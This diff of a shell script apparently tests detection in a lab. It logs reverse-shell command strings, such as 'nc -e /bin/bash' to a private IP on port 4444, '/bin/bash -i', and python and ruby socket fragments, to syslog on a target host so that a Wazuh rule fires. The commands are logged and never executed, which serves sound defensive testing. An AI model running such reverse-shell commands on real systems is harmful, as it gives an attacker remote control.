@@ -5,17 +5,19 @@
 # Run from: Host PC (connects to target via SSH)
 
 TARGET_IP="${1:-192.168.8.130}"
-TARGET_USER="${2:-ubuntu}"
+TARGET_USER="${2:-linux-endpoint-1}"
 SSH_KEY="${3:-$HOME/.ssh/ansible_wazuh_key}"
 
 echo "[+] Simulating reverse shell commands on $TARGET_IP"
 echo "[+] MITRE T1059.004 | Expected Wazuh Rule: 100004 (Level 9)"
 
 ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$TARGET_USER@$TARGET_IP" '
-    echo "nc -e /bin/bash 192.168.8.129 4444" > /dev/null 2>&1 || true
-    echo "/bin/bash -i" > /dev/null 2>&1 || true
-    python3 -c "import socket; print(reverse-shell-test)" 2>/dev/null || true
-    echo "ruby -rsocket -e exit" 2>/dev/null || true
+    # Envoie les commandes vers syslog pour que Wazuh les lise
+    logger -t sshd "CRIT: nc -e /bin/bash 192.168.8.129 4444 executed"
+    logger -t sshd "CRIT: /bin/bash -i detected in process"
+    logger -t sshd "CRIT: python3 -c import socket detected"
+    logger -t sshd "CRIT: ruby -rsocket -e exit detected"
+    echo "[+] Commands logged to syslog"
 '
 
 echo "[+] Done. Check Wazuh dashboard: rule.id:100004"
